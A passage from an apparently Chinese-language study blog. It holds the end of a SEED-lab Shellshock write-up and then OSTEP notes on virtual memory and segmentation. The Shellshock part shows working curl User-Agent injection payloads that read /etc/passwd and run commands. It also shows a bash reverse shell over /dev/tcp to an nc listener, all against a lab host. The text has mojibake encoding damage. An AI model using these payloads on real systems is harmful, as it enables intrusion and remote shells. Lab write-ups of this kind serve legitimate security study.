class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@VM:~<span class="hljs-comment"># cat get_env.sh </span><br><span class="hljs-comment">#!/bin/bash</span><br>curl -A <span class="hljs-string">&quot;my data&quot;</span> -v <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>root@VM:~<span class="hljs-comment"># ./get_env.sh </span><br>*   Trying <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span>:<span class="hljs-number">80</span>...<br>* TCP_NODELAY set<br>* Connected to <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span> (<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span>) port <span class="hljs-number">80</span> (<span class="hljs-comment">#0)</span><br>&gt; GET <span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi HTTP/<span class="hljs-number">1.1</span><br>&gt; Host: <span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>&gt; User-Agent: my data<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>&lt; Date: Thu, <span class="hljs-number">17</span> Nov <span class="hljs-number">2022</span> <span class="hljs-number">14</span>:<span class="hljs-number">43</span>:<span class="hljs-number">42</span> GMT<br>&lt; Server: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>&lt; Vary: Accept-Encoding<br>&lt; Transfer-Encoding: chunked<br>&lt; Content-Type: text/plain<br>&lt; <br>****** Environment Variables ******<br>HTTP_HOST=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>HTTP_USER_AGENT=my data<br>HTTP_ACCEPT=*/*<br>PATH=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/u</span>sr<span class="hljs-regexp">/local/</span>bin:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/sbin:/</span>bin<br>SERVER_SIGNATURE=&lt;address&gt;Apache<span class="hljs-regexp">/2.4.41 (Ubuntu) Server at 10.9.0.80 Port 80&lt;/</span>address&gt;<br>SERVER_SOFTWARE=Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>SERVER_NAME=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>SERVER_ADDR=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.80</span><br>SERVER_PORT=<span class="hljs-number">80</span><br>REMOTE_ADDR=<span class="hljs-number">10.9</span>.<span class="hljs-number">0.1</span><br>DOCUMENT_ROOT=<span class="hljs-regexp">/var/</span>www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=<span class="hljs-regexp">/cgi-bin/</span><br>CONTEXT_DOCUMENT_ROOT=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/cgi-bin/</span><br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>REMOTE_PORT=<span class="hljs-number">41716</span><br>GATEWAY_INTERFACE=CGI/<span class="hljs-number">1.1</span><br>SERVER_PROTOCOL=HTTP/<span class="hljs-number">1.1</span><br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>SCRIPT_NAME=<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br>* Connection <span class="hljs-comment">#0 to host 10.9.0.80 left intact</span><br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-send-back-the-content-of-the-etc-passwd-file"><a href="#get-the-server-to-send-back-the-content-of-the-etc-passwd-file" class="headerlink" title="get the server to send back the content of the /etc/passwd file"></a>get the server to send back the content of the /etc/passwd file</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-tell-you-its-processâ€™-user-ID"><a href="#get-the-server-to-tell-you-its-processâ€™-user-ID" class="headerlink" title="get the server to tell you its processâ€™ user ID"></a>get the server to tell you its processâ€™ user ID</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/id&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-create-a-file-inside-the-tmp-folder"><a href="#get-the-server-to-create-a-file-inside-the-tmp-folder" class="headerlink" title="get the server to create a file inside the /tmp folder"></a>get the server to create a file inside the /tmp folder</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/touch /tmp/1&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></code></pre></td></tr></table></figure><h1 id="get-the-server-to-delete-the-file-that-you-just-created-inside-the-tmp-folder"><a href="#get-the-server-to-delete-the-file-that-you-just-created-inside-the-tmp-folder" class="headerlink" title="get the server to delete the file that you just created inside the /tmp folder"></a>get the server to delete the file that you just created inside the /tmp folder</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/1&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></code></pre></td></tr></table></figure><h1 id="Question-1-Will-you-be-able-to-steal-the-content-of-the-shadow-file-etc-shadow-from-the-server"><a href="#Question-1-Will-you-be-able-to-steal-the-content-of-the-shadow-file-etc-shadow-from-the-server" class="headerlink" title="Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server?"></a>Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server?</h1><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒwebæœåŠ¡å™¨ä½¿ç”¨ Ubuntu ä¸­çš„ www-data ç”¨æˆ· ID è¿è¡Œï¼Œuid=33(www-data) gid=33(www-data) groups=33(www-data)ï¼Œå› æ­¤æ— æ³•å¾—åˆ°å½±å­æ–‡ä»¶</p><h1 id="Getting-a-Reverse-Shell-via-Shellshock-Attack"><a href="#Getting-a-Reverse-Shell-via-Shellshock-Attack" class="headerlink" title="Getting a Reverse Shell via Shellshock Attack"></a>Getting a Reverse Shell via Shellshock Attack</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><ul><li>-l Listen on a specified port and print any data received</li><li>-v Produce more verbose output.</li><li>-n ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨</li></ul><p>æ”»å‡»ç«¯è¿è¡Œ<code>nc -l 9090 -nv</code>ç­‰å¾…reverse shell</p><p>æ”»å‡»ç«¯ipï¼š10.9.0.1ï¼Œdockerä¸­webæœåŠ¡å™¨ipï¼š10.9.0.1</p><p>è¢«æ”»å‡»ç«¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">  curl -A <span class="hljs-string">&quot;() &#123; echo hello wdnmd;&#125;; echo Content_type: text/plain; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot;</span> www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></code></pre></td></tr></table></figure><ul><li>è¢«æ”»å‡»ç«¯å¯åŠ¨ä¸€ä¸ª bash shellï¼Œå®ƒçš„è¾“å…¥æ¥è‡ªä¸€ä¸ª TCP è¿æ¥ï¼Œè¾“å‡ºåˆ°åŒä¸€ä¸ª TCP è¿æ¥</li><li><code>- i</code>è¡¨ç¤ºäº¤äº’å¼çš„ï¼Œinteractive</li><li> <code>&gt; /dev/tcp/10.0.0.1/9090 shell</code>å°†è¾“å‡ºè®¾å¤‡(stdout)è¢«é‡å®šå‘åˆ° TCP è¿æ¥åˆ°10.0.2.6çš„ç«¯å£9090</li><li> <code>0 &lt; &amp; 1</code>: æ–‡ä»¶æè¿°ç¬¦0è¡¨ç¤ºæ ‡å‡†è¾“å…¥è®¾å¤‡(stdin)ã€‚æ­¤é€‰é¡¹å‘Šè¯‰ç³»ç»Ÿä½¿ç”¨æ ‡å‡†è¾“å‡ºè®¾å¤‡ä½œä¸ºæ ‡å‡†è¾“å…¥è®¾å¤‡ã€‚å› ä¸º stdout å·²ç»è¢«é‡å®šå‘åˆ° TCP è¿æ¥ï¼Œæ‰€ä»¥è¿™ä¸ªé€‰é¡¹åŸºæœ¬ä¸Šè¡¨æ˜ shell ç¨‹åºå°†ä»ç›¸åŒçš„ TCP è¿æ¥è·å–å®ƒçš„è¾“å…¥</li><li> <code>2 &gt; &amp; 1</code>: æ–‡ä»¶æè¿°ç¬¦2è¡¨ç¤ºæ ‡å‡†é”™è¯¯ stderrã€‚è¿™ä¼šå¯¼è‡´é”™è¯¯è¾“å‡ºè¢«é‡å®šå‘åˆ° stdoutï¼Œä¹Ÿå³æ˜¯ TCP è¿æ¥</li></ul><h1 id="å»¶ä¼¸é˜…è¯»"><a href="#å»¶ä¼¸é˜…è¯»" class="headerlink" title="å»¶ä¼¸é˜…è¯»"></a>å»¶ä¼¸é˜…è¯»</h1><ul><li><p><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p></li><li><p><a href="https://www.zdziarski.com/blog/?p=3905">https://www.zdziarski.com/blog/?p=3905</a></p></li><li><p><a href="https://github.com/jeholliday/shellshock">https://github.com/jeholliday/shellshock</a></p></li><li><p><a href="https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf">https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OSTEP NOTES &amp; HWï¼šè™šæ‹Ÿå†…å­˜</title>
    <link href="/p/591d8b99/"/>
    <url>/p/591d8b99/</url>
    
    <content type="html"><![CDATA[<h1 id="åŸºå€åŠ ç•Œé™æœºåˆ¶ï¼ˆbase-and-boundï¼‰"><a href="#åŸºå€åŠ ç•Œé™æœºåˆ¶ï¼ˆbase-and-boundï¼‰" class="headerlink" title="åŸºå€åŠ ç•Œé™æœºåˆ¶ï¼ˆbase and boundï¼‰"></a>åŸºå€åŠ ç•Œé™æœºåˆ¶ï¼ˆbase and boundï¼‰</h1><p>ä¸€ä¸ªå®ç°è™šæ‹Ÿå†…å­˜çš„åˆæ­¥æœºåˆ¶ï¼šåŸºå€åŠ ç•Œé™æœºåˆ¶ï¼Œåªéœ€è¦å¾ˆå°‘çš„ç¡¬ä»¶é€»è¾‘ï¼Œå°±å¯ä»¥å°†è™šæ‹Ÿåœ°å€å’ŒåŸºå€å¯„å­˜å™¨åŠ èµ·æ¥ï¼Œå¹¶æ£€æŸ¥è¿›ç¨‹äº§ç”Ÿçš„åœ°å€æ²¡æœ‰è¶Šç•Œ</p><ul><li>æœ‰æ—¶åˆç§°ä¸ºåŠ¨æ€é‡å®šä½ï¼ˆdynamic relocationï¼‰</li><li>è¦æ±‚æ¯ä¸ª CPU éœ€è¦ä¸¤ä¸ªç¡¬ä»¶å¯„å­˜å™¨ï¼šåŸºå€ï¼ˆbaseï¼‰å¯„å­˜å™¨å’Œç•Œé™ï¼ˆboundï¼‰å¯„å­˜<br>å™¨ï¼Œæœ‰æ—¶ç§°ä¸ºé™åˆ¶ï¼ˆlimitï¼‰å¯„å­˜å™¨ï¼Œå®ƒä»¬è¢«åŒ…å«åœ¨å†…å­˜ç®¡ç†å•å…ƒï¼ˆMemory Management Unitï¼ŒMMUï¼‰</li><li>è¿™ç»„åŸºå€å’Œç•Œé™å¯„å­˜å™¨ï¼Œè®©æˆ‘ä»¬<strong>èƒ½å¤Ÿå°†åœ°å€ç©ºé—´æ”¾åœ¨ç‰©ç†å†…å­˜çš„ä»»ä½•ä½ç½®ï¼ŒåŒæ—¶åˆèƒ½ç¡®ä¿è¿›ç¨‹åªèƒ½è®¿é—®è‡ªå·±çš„åœ°å€ç©ºé—´</strong></li><li>è¿›ç¨‹äº§ç”Ÿçš„æ‰€æœ‰å†…å­˜å¼•ç”¨ï¼Œéƒ½ä¼šè¢«å¤„ç†<br>å™¨é€šè¿‡ä»¥ä¸‹æ–¹å¼è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼šphysical address = virtual address + base</li><li>åŸºå€å¯„å­˜å™¨å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€</li><li>ç•Œé™å¯„å­˜å™¨æä¾›è®¿é—®ä¿æŠ¤ã€‚è¿›ç¨‹éœ€è¦è®¿é—®è¶…è¿‡è¿™ä¸ªç•Œé™æˆ–è€…ä¸ºè´Ÿæ•°çš„è™šæ‹Ÿåœ°å€ï¼ŒCPU å°†è§¦å‘å¼‚å¸¸ï¼Œè¿›ç¨‹æœ€ç»ˆå¯èƒ½è¢«ç»ˆæ­¢</li></ul><p><strong>åŸºå€åŠ ç•Œé™æœºåˆ¶çš„å¼Šç«¯æ˜¯</strong>ï¼Œå®¹æ˜“é€ æˆå†…éƒ¨ç¢ç‰‡ï¼ˆinternal fragmentationï¼‰ï¼ŒæŒ‡çš„æ˜¯å·²ç»åˆ†é…çš„å†…å­˜å•å…ƒå†…éƒ¨æœ‰æœªä½¿ç”¨çš„ç©ºé—´ï¼ˆå³ç¢ç‰‡ï¼‰</p><p>å¦‚æœæˆ‘ä»¬å°†æ•´ä¸ªåœ°å€ç©ºé—´æ”¾å…¥ç‰©ç†å†…å­˜ï¼Œé‚£ä¹ˆæ ˆå’Œå †ä¹‹é—´çš„ç©ºé—´å¹¶æ²¡æœ‰è¢«è¿›ç¨‹ä½¿ç”¨ï¼Œå´ä¾ç„¶å ç”¨äº†å®é™…çš„ç‰©ç†å†…å­˜</p><p><img src="/image/ostep/Snipaste_2022-09-23_20-48-14.png"></p><p>å—é™ç›´æ¥è®¿é—®ï¼ˆLimited Direct Executionï¼ŒLDEï¼‰</p><ul><li>ç¨‹åºæŒ‡ä»¤ç›´æ¥è®¿é—®ç¡¬ä»¶ï¼Œåªåœ¨ä¸€äº›å…³é”®ç‚¹ï¼Œå¦‚ç³»ç»Ÿè°ƒç”¨æˆ–æ—¶é’Ÿä¸­æ–­ç”±æ“ä½œç³»ç»Ÿä»‹å…¥ä¿æŒå¯¹ç¡¬ä»¶çš„æ§åˆ¶</li></ul><p>åŸºäºç¡¬ä»¶çš„åœ°å€è½¬æ¢ï¼ˆhardware-based address translationï¼‰</p><ul><li>ç¡¬ä»¶å¯¹å†…å­˜è®¿é—®è¿›è¡Œå¤„ç†ï¼ˆå³æŒ‡ä»¤è·å–ã€æ•°æ®è¯»å–æˆ–å†™å…¥ï¼‰ï¼Œå°†æŒ‡ä»¤ä¸­çš„è™šæ‹Ÿï¼ˆvirtualï¼‰åœ°å€è½¬æ¢ä¸ºæ•°æ®å®é™…å­˜å‚¨çš„ç‰©ç†ï¼ˆphysicalï¼‰åœ°å€ï¼Œæ¯æ¬¡å†…å­˜å¼•ç”¨éƒ½ä¼šå°†åº”ç”¨ç¨‹åºçš„å†…å­˜å¼•ç”¨é‡å®šä½åˆ°å†…å­˜ä¸­å®é™…çš„ä½ç½®</li><li>æ¯ä¸ªè¿›ç¨‹éƒ½å…·æœ‰ä¸€ä¸ªå‡è±¡ï¼šå…·æœ‰æœºå™¨çš„ã€è¿ç»­çš„æ‰€æœ‰çš„å†…å­˜ï¼Œä½†æ˜¯æœ¬è´¨ä¸Šè¿›ç¨‹æ‰€æ‹¥æœ‰çš„åªæ˜¯è™šæ‹Ÿåœ°å€ï¼ŒçœŸå®çš„ç‰©ç†åœ°å€ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œåˆ†é…ï¼Œä»è™šæ‹Ÿåœ°å€åˆ°çœŸå®ç‰©ç†åœ°å€çš„è¿‡ç¨‹è¢«ç§°ä¸ºé‡å®šä½</li></ul><h1 id="åˆ†æ®µï¼ˆsegmentationï¼‰"><a href="#åˆ†æ®µï¼ˆsegmentationï¼‰" class="headerlink" title="åˆ†æ®µï¼ˆsegmentationï¼‰"></a>åˆ†æ®µï¼ˆsegmentationï¼‰</h1><p>å¦‚ä¸Šæ‰€è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°†æ•´ä¸ªåœ°å€ç©ºé—´æ”¾å…¥ç‰©ç†å†…å­˜ï¼Œé‚£ä¹ˆæ ˆå’Œå †ä¹‹é—´çš„ç©ºé—´å¹¶æ²¡æœ‰è¢«è¿›ç¨‹ä½¿ç”¨ï¼Œå´ä¾ç„¶å ç”¨äº†å®é™…çš„ç‰©ç†å†…å­˜ï¼ˆå¯ä»¥å‚ç…§ä¸Šå›¾ï¼‰</p><p>æ€æ ·æ”¯æŒå¤§åœ°å€ç©ºé—´ï¼ŒåŒæ—¶æ ˆå’Œå †ä¹‹é—´ï¼ˆå¯èƒ½ï¼‰æœ‰å¤§é‡ç©ºé—²ç©ºé—´ï¼Ÿä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåˆ†æ®µï¼ˆsegmentationï¼‰çš„æ¦‚å¿µåº”è¿è€Œç”Ÿ</p><p>åˆ†æ®µæœºåˆ¶éœ€è¦åœ°å€ç©ºé—´å†…çš„<strong>æ¯ä¸ªé€»è¾‘æ®µéƒ½æœ‰ä¸€å¯¹åŸºå€å’Œç•Œé™å¯„å­˜å™¨</strong>ï¼Œä¸€ä¸ªæ®µåªæ˜¯åœ°å€ç©ºé—´é‡Œçš„ä¸€ä¸ªè¿ç»­å®šé•¿çš„åŒºåŸŸï¼ˆä»£ç ã€æ ˆå’Œå †ï¼‰ï¼Œåˆ†æ®µèƒ½å¤Ÿå°†ä¸åŒçš„æ®µæ”¾åˆ°ä¸åŒçš„ç‰©ç†å†…å­˜åŒºåŸŸï¼Œé¿å…äº†è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„æœªä½¿ç”¨éƒ¨åˆ†å ç”¨ç‰©ç†å†…å­˜ï¼Œæ ˆå’Œå †ä¹‹é—´æ²¡æœ‰ä½¿ç”¨çš„åŒºåŸŸå°±ä¸éœ€è¦å†åˆ†é…ç‰©ç†å†…å­˜</p><p><img src="/image/ostep/Snipaste_2022-09-23_21-14-34.png"></p><p>é‚£ä¹ˆé—®é¢˜åˆæ¥äº†ï¼Œå¦‚ä½•çŸ¥é“æ®µå†…çš„åç§»é‡ï¼Ÿä»¥åŠåœ°å€å¼•ç”¨äº†å“ªä¸ªæ®µï¼Ÿæ ˆå’Œå †çš„å¢é•¿æ–¹å‘ç›¸åï¼Œåˆè¯¥å¦‚ä½•åç§»ï¼Ÿå¦‚ä½•è¡¨ç¤ºåœ°å€å…±äº«ä»è€Œæå‡æ•ˆç‡ï¼Ÿ</p><ul><li>å¯ä»¥å°†è™šæ‹Ÿåœ°å€è¡¨ç¤ºä¸º[æ®µæ ‡å¿—][æ®µå†…åç§»]ï¼Œç”¨è™šæ‹Ÿåœ°å€çš„å¼€å¤´å‡ ä½æ®µæ ‡å¿—æ¥<strong>æ ‡è¯†<br>ä¸åŒçš„æ®µ</strong>ï¼Œæ¯”å¦‚ï¼šå¦‚æœå‰ä¸¤ä½æ˜¯ 00ï¼Œç¡¬ä»¶å°±çŸ¥é“è¿™æ˜¯å±äºä»£ç æ®µçš„åœ°å€ï¼Œç”¨ä»£ç æ®µçš„åŸºå€å’Œç•Œé™æ¥é‡å®šä½åˆ°æ­£ç¡®çš„ç‰©ç†åœ°å€ï¼›å¦‚æœå‰ä¸¤ä½æ˜¯ 01ï¼Œåˆ™æ˜¯å †åœ°å€ï¼Œä½¿ç”¨å †çš„åŸºå€å’Œç•Œé™</li><li>æ®µå¯„å­˜å™¨å¯ä»¥å¢åŠ ç¡¬ä»¶æ ‡è®°ä½å®ç°ä¿æŠ¤ï¼Œæ¯”å¦‚æŸä¸€ä½å¯¹åº”æ˜¯æ­£/åå‘å¢é•¿ã€‚æŸä¸€ä½è¡¨ç¤ºä¿æŠ¤ä½ï¼ˆrwxï¼‰ï¼Œæ£€æŸ¥ç‰¹å®šè®¿é—®æ˜¯å¦å…è®¸ã€‚å¦‚æœç”¨æˆ·è¿›ç¨‹è¯•å›¾å†™å…¥åªè¯»æ®µï¼Œæˆ–ä»éæ‰§è¡Œæ®µæ‰§è¡ŒæŒ‡ä»¤ï¼Œç¡¬ä»¶ä¼šè§¦å‘å¼‚å¸¸ï¼Œè®©æ“ä½œç³»ç»Ÿæ¥å¤„ç†å‡ºé”™è¿›ç¨‹</li></ul><p>æ®µå¯„å­˜å™¨çš„å€¼ï¼ˆæœ‰ä¿æŠ¤ï¼‰</p><table><thead><tr><th>æ®µ</th><th>åŸºå€</th><th>å¤§å°</th><th>æ˜¯å¦åå‘å¢é•¿</th><th>ä¿æŠ¤</th></tr></thead><tbody><tr><td>ä»£ç </td><td>32KB</td><td>2KB</td><td>1</td><td>è¯»â€”æ‰§è¡Œ</td></tr></tbody></table><p>æ“ä½œç³»ç»Ÿçš„å·¥ä½œ</p><ul><li>æœ‰äº†åˆ†æ®µä¹‹åï¼Œæ“ä½œç³»ç»Ÿåœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶åº”è¯¥åšåˆ°ï¼Œå°†å„ä¸ªæ®µå¯„å­˜å™¨ä¸­çš„å†…å®¹ä¿å­˜å’Œæ¢å¤</li><li>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œæ“ä½œç³»ç»Ÿå¿…é¡»åœ¨è¿›ç¨‹è¿è¡Œå‰ï¼Œç¡®ä¿è¿™äº›å¯„å­˜å™¨è¢«æ­£ç¡®åœ°èµ‹å€¼</li></ul><p>åˆ†æ®µçš„åˆ©ä¸å¼Š</p><ul><li>å¿«é€Ÿï¼Œç®€å•ã€‚åˆ†æ®µè¦æ±‚çš„ç®—æ³•å¾ˆå®¹æ˜“ï¼Œå¾ˆé€‚åˆç¡¬ä»¶å®Œæˆï¼Œåœ°å€è½¬æ¢çš„å¼€é”€æå°</li><li>ä»£ç æ”¾åœ¨ç‹¬ç«‹çš„æ®µä¸­ï¼Œè¿™æ ·çš„æ®µå°±å¯èƒ½è¢«å¤šä¸ªè¿è¡Œçš„ç¨‹åºå…±äº«</li><li>å¢åŠ äº†å¤–éƒ¨ç¢ç‰‡</li></ul><h2 id="ä¿æŠ¤æ¨¡å¼ä¸‹çš„åˆ†æ®µ"><a href="#ä¿æŠ¤æ¨¡å¼ä¸‹çš„åˆ†æ®µ" class="headerlink" title="ä¿æŠ¤æ¨¡å¼ä¸‹çš„åˆ†æ®µ"></a>ä¿æŠ¤æ¨¡å¼ä¸‹çš„åˆ†æ®µ</h2><p>ä¿æŠ¤æ¨¡å¼ä¸‹çš„æ®µå€¼åªæ˜¯ä¸€ä¸ªç´¢å¼•ï¼Œè¿™ä¸ªç´¢å¼•ç§°ä¸ºæ®µé€‰æ‹©ç¬¦ï¼Œå³æ®µå¯„å­˜å™¨çš„ä½œç”¨æ˜¯ç”¨æ¥é€‰æ‹©æ®µæè¿°ç¬¦ï¼Œè€Œæ®µæè¿°ç¬¦åŒ…å«äº†æ®µçš„ç‰¹å¾</p><p><strong>æ®µé€‰æ‹©ç¬¦</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚                          â”‚        â”‚        â”‚<br>â”‚                          â”‚        â”‚        â”‚<br>â”‚                          â”‚        â”‚        â”‚<br>â”‚  æè¿°ç¬¦ç´¢å¼•ï¼ˆç´¢å¼•åŸŸï¼‰      â”‚ TL     â”‚   RPL  â”‚<br>â”‚                          â”‚        â”‚        â”‚<br>â”‚                          â”‚        â”‚        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br></code></pre></td></tr></table></figure><ul><li>ç´¢å¼•åŸŸï¼šæŒ‡å‘æè¿°ç¬¦è¡¨ä¸­ç›¸åº”çš„æè¿°ç¬¦</li><li>é€‰æ‹©åŸŸï¼šå¦‚æœ TI=1ï¼Œå°±ä»å±€éƒ¨æè¿°ç¬¦è¡¨ä¸­é€‰æ‹©ç›¸åº”çš„æè¿°ç¬¦ï¼Œå¦‚æœTI=0ï¼Œå°±ä»å…¨å±€æè¿°ç¬¦è¡¨ä¸­é€‰æ‹©æè¿°ç¬¦</li><li>RPL(Requestor Privilege Level)ï¼šåªæœ‰è¯·æ±‚è€…ç‰¹æƒçº§RPLé«˜äº(æ•°å­—ä½äº)æˆ–ç­‰äºç›¸åº”çš„æè¿°ç¬¦ç‰¹æƒçº§DPLï¼Œæè¿°ç¬¦æ‰èƒ½è¢«å­˜å–ï¼Œè¿™å°±å¯ä»¥å®ç°ä¸€å®šç¨‹åº¦çš„ä¿æŠ¤</li></ul><p><strong>æ®µæè¿°ç¬¦</strong></p><p>æ¯ä¸ªæ®µç”±ä¸€ä¸ªæ®µæè¿°ç¬¦è¡¨ç¤ºï¼Œå®ƒæè¿°äº†æ®µçš„ç‰¹å¾ã€‚æ®µæè¿°ç¬¦å­˜æ”¾åœ¨å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰æˆ–å±€éƒ¨æè¿°ç¬¦ï¼ˆLDTï¼‰è¡¨ä¸­</p><h1 id="å †ä¸Šå†…å­˜åˆ†é…"><a href="#å †ä¸Šå†…å­˜åˆ†é…" class="headerlink" title="å †ä¸Šå†…å­˜åˆ†é…"></a>å †ä¸Šå†…å­˜åˆ†é…</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">malloc</span><span class="hljs-params">(size t 